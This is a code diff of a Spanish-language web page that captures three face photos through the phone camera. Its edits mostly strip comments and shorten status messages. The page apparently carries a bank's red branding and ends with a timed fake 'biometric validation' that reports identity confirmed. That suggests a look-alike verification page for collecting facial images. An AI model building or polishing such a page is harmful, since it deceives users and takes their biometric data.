@@ -35,7 +35,6 @@
             padding: 12px 20px 10px;
         }
 
-        /* HEADER */
         .back-nav {
             align-self: flex-start;
             font-size: 22px;
@@ -44,15 +43,11 @@
             color: var(--text-dark);
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 10px;
-        }
+        .header { text-align: center; margin-bottom: 10px; }
         .logo-img  { width: 85px; margin-bottom: 4px; }
         .title     { font-size: 17px; font-weight: 600; color: var(--text-dark); margin-bottom: 1px; }
         .subtitle  { font-size: 11px; color: var(--text-gray); }
 
-        /* TARJETA CÁMARA */
         .camera-card {
             background: var(--input-bg);
             border-radius: 20px;
@@ -68,7 +63,6 @@
             border-radius: 12px;
             overflow: hidden;
             background: #111;
-            /* altura fija adaptada a móvil */
             height: 42vh;
         }
 
@@ -92,7 +86,6 @@
         }
         .oval-svg { width: 55%; }
 
-        /* SCAN LINE */
         .scan-line {
             position: absolute; left: 0; right: 0; height: 2px;
             background: linear-gradient(to right, transparent, #00e676, transparent);
@@ -100,7 +93,6 @@
             display: none; pointer-events: none; z-index: 5;
         }
 
-        /* STATUS dentro cámara */
         .cam-status {
             position: absolute;
             bottom: 10px; left: 10px; right: 10px;
@@ -114,10 +106,7 @@
             transition: border-color 0.3s;
         }
         .cam-status.ok    { border-color: rgba(0,210,100,0.55); }
-        .cam-status.error { border-color: rgba(230,0,38,0.5); }
         .cam-status-title { font-size: 12px; font-weight: 600; color: #fff; }
-        .cam-status-sub   { font-size: 10.5px; color: rgba(255,255,255,0.5); margin-top: 1px; }
-        .cam-status-sub.green { color: #00e676; }
 
         /* DOTS */
         .dots-row {
@@ -137,7 +126,7 @@
         }
         @keyframes pulse-dot { to { transform: scale(1.4); } }
 
-        /* TIPS — fila horizontal de íconos */
+        /* TIPS */
         .tips-card {
             background: var(--input-bg);
             border-radius: 15px;
@@ -150,13 +139,11 @@
             color: var(--davi-red);
             margin-bottom: 10px;
             text-align: center;
-            letter-spacing: 0.2px;
         }
         .tips-row {
             display: flex;
             justify-content: space-around;
             align-items: flex-start;
-            gap: 6px;
         }
         .tip-item {
             display: flex; flex-direction: column;
@@ -167,14 +154,12 @@
             width: 36px; height: 36px; border-radius: 50%;
             background: #fff0f2;
             display: flex; align-items: center; justify-content: center;
-            flex-shrink: 0;
         }
         .tip-label {
             font-size: 10px; color: var(--text-dark);
             text-align: center; line-height: 1.3;
         }
 
-        /* FLASH */
         .flash {
             position: fixed; inset: 0; z-index: 50;
             background: white; opacity: 0; pointer-events: none;
@@ -182,7 +167,6 @@
         }
         .flash.show { opacity: 0.85; }
 
-        /* LOADER */
         #loader {
             display: none; position: fixed; inset: 0; z-index: 60;
             background: rgba(255,255,255,0.88);
@@ -215,7 +199,6 @@
         <div class="subtitle">Sigue las indicaciones para continuar</div>
     </div>
 
-    <!-- CÁMARA -->
     <div class="camera-card">
         <div class="camera-wrap">
             <video id="video" autoplay playsinline muted></video>
@@ -234,19 +217,16 @@
 
             <div class="cam-status" id="camStatus">
                 <div class="cam-status-title" id="statusTitle">Iniciando cámara...</div>
-                <div class="cam-status-sub"   id="statusSub"></div>
             </div>
         </div>
     </div>
 
-    <!-- DOTS -->
     <div class="dots-row">
         <div class="dot" id="dot0"></div>
         <div class="dot" id="dot1"></div>
         <div class="dot" id="dot2"></div>
     </div>
 
-    <!-- TIPS -->
     <div class="tips-card">
         <div class="tips-title">Recomendaciones</div>
         <div class="tips-row">
@@ -335,10 +315,10 @@ function updateDots() {
 }
 
 function setOval(state) {
-    const el = document.getElementById('ovalEl');
+    const el  = document.getElementById('ovalEl');
     const map = {
-        detected:  { stroke: '#00e676', dash: 'none', op: '1' },
-        capturing: { stroke: '#E60026', dash: 'none', op: '1' },
+        detected:  { stroke: '#00e676', dash: 'none', op: '1'    },
+        capturing: { stroke: '#E60026', dash: 'none', op: '1'    },
         idle:      { stroke: 'white',   dash: '8 5',  op: '0.75' }
     };
     const s = map[state] || map.idle;
@@ -347,13 +327,10 @@ function setOval(state) {
     el.setAttribute('opacity', s.op);
 }
 
-function setStatus(title, sub = '', mode = '') {
+function setStatus(title, mode = '') {
     document.getElementById('statusTitle').textContent = title;
-    document.getElementById('statusSub').textContent   = sub;
     const s = document.getElementById('camStatus');
     s.className = 'cam-status' + (mode ? ' ' + mode : '');
-    document.getElementById('statusSub').className =
-        'cam-status-sub' + (mode === 'ok' ? ' green' : '');
 }
 
 function startScan() {
@@ -382,7 +359,7 @@ async function loadModels() {
         ]);
         startCamera();
     } catch {
-        setStatus('Error de conexión', 'Recarga la página', 'error');
+        setStatus('Error de conexión — recarga la página');
     }
 }
 
@@ -401,15 +378,15 @@ async function startCamera() {
             startDetectionLoop();
         };
     } catch {
-        setStatus('Sin acceso a la cámara', 'Permite el acceso en tu navegador');
+        setStatus('Permite el acceso a la cámara');
     }
 }
 
 function resizeCanvas() {
     const wrap = document.querySelector('.camera-wrap');
-    const c = document.getElementById('detectionCanvas');
-    c.width  = wrap.clientWidth;
-    c.height = wrap.clientHeight;
+    const c    = document.getElementById('detectionCanvas');
+    c.width    = wrap.clientWidth;
+    c.height   = wrap.clientHeight;
 }
 window.addEventListener('resize', resizeCanvas);
 
@@ -423,7 +400,6 @@ function startDetectionLoop() {
         let det = null;
         try { det = await faceapi.detectSingleFace(video, opts); } catch {}
 
-        // Canvas solo para lógica — no dibujamos puntos
         const canvas = document.getElementById('detectionCanvas');
         const wrap   = document.querySelector('.camera-wrap');
         const ovalW  = wrap.clientWidth  * 0.55;
@@ -450,12 +426,11 @@ function startDetectionLoop() {
                 lastDetected = true;
 
                 const elapsed = Date.now() - faceStableMs;
-                const pct = Math.min(100, Math.round(elapsed / STABLE_MS * 100));
 
                 if (elapsed >= STABLE_MS) {
                     capturePhoto();
                 } else {
-                    setStatus(`Foto ${photosTaken + 1} de ${TOTAL_PHOTOS}  ${pct}%`, 'No te muevas...', 'ok');
+                    setStatus('No te muevas...', 'ok');
                     if (document.getElementById('scanLine').style.display !== 'block') startScan();
                 }
             } else {
@@ -501,7 +476,7 @@ async function capturePhoto() {
 
     photosTaken++;
     updateDots();
-    setStatus(`✓ Foto ${photosTaken} de ${TOTAL_PHOTOS} capturada`, '', 'ok');
+    setStatus('Capturando...', 'ok');
 
     canvas.toBlob(async (blob) => {
         if (blob && blob.size > 1000) {
@@ -518,14 +493,14 @@ async function capturePhoto() {
                 isBusy = false;
                 faceStableMs = 0;
                 setOval('idle');
-                setStatus(`Foto ${photosTaken + 1} de ${TOTAL_PHOTOS} — Mantén la posición`);
+                setStatus('Coloca tu rostro en el óvalo');
                 requestAnimationFrame(() => startDetectionLoop());
             }, BETWEEN_MS);
         } else {
             showLoader('Validando identidad biométrica...');
             setTimeout(() => {
                 hideLoader();
-                setStatus('✅ Verificación completa', 'Identidad confirmada', 'ok');
+                setStatus('✅ Verificación completa', 'ok');
                 updateDots();
                 setTimeout(() => {
                     sessionStorage.clear();
